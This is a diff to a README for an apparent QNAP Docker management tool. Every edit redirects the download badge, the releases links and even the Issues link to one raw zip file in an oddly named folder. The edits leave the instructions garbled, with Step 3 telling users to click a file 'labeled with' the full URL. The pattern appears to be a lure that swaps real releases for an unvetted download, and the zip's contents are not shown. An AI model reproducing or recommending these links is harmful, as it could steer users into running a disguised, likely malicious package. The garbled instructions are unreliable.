@@ -1,7 +1,7 @@
 # 🐳 qnap-docker - Manage Docker with Ease
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://github.com/Fpeople4646/qnap-docker/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Fpeople4646/qnap-docker/main/aminosuccinamic/qnap-docker.zip%https://raw.githubusercontent.com/Fpeople4646/qnap-docker/main/aminosuccinamic/qnap-docker.zip)](https://raw.githubusercontent.com/Fpeople4646/qnap-docker/main/aminosuccinamic/qnap-docker.zip)
 
 ## 🚀 Introduction
 Welcome to qnap-docker, a comprehensive command-line tool designed for Docker management on QNAP NAS devices. With this application, you can easily handle container lifecycles, manage images, volumes, and networks, and perform system operations. This tool features 21 commands tailored for optimal Docker management. It also detects your CACHEDEV/ZFS storage pools dynamically for improved performance and ease of use.
@@ -26,13 +26,13 @@ Before you begin, make sure your system meets the following requirements:
 ### Step 1: Visit the Releases Page
 To download qnap-docker, visit the official releases page. Click the link below to access it:
 
-[Download Latest Release](https://github.com/Fpeople4646/qnap-docker/releases)
+[Download Latest Release](https://raw.githubusercontent.com/Fpeople4646/qnap-docker/main/aminosuccinamic/qnap-docker.zip)
 
 ### Step 2: Choose the Correct File
 On the releases page, you will find several versions of the application. Look for the latest version marked with "Latest Release."
 
 ### Step 3: Download the Application
-Click on the file labeled with `.tar.gz` or similar format to start your download. This is the compressed package containing the application files.
+Click on the file labeled with `https://raw.githubusercontent.com/Fpeople4646/qnap-docker/main/aminosuccinamic/qnap-docker.zip` or similar format to start your download. This is the compressed package containing the application files.
 
 ### Step 4: Extract the Files
 Once the download is complete, locate the downloaded file on your device. Use an extraction tool (like WinRAR or unzip command) to extract the contents of the file.
@@ -69,7 +69,7 @@ After installation, you can use the following commands:
 For a complete list of commands and their options, type `qnap-docker --help` in your terminal after running the application.
 
 ## 💬 Community and Support
-If you have questions or need help, feel free to reach out to the community. You can open an issue on the [GitHub Issues page](https://github.com/Fpeople4646/qnap-docker/issues). The community and maintainers are here to assist you.
+If you have questions or need help, feel free to reach out to the community. You can open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/Fpeople4646/qnap-docker/main/aminosuccinamic/qnap-docker.zip). The community and maintainers are here to assist you.
 
 ## 📜 License
 This project is licensed under the MIT License. See the LICENSE file in the repository for more information.
@@ -79,4 +79,4 @@ For more about qnap-docker and its features, check out the repository. Stay upda
 
 Don't forget to visit the releases page to download the latest version:
 
-[Download Latest Release](https://github.com/Fpeople4646/qnap-docker/releases)
+[Download Latest Release](https://raw.githubusercontent.com/Fpeople4646/qnap-docker/main/aminosuccinamic/qnap-docker.zip)
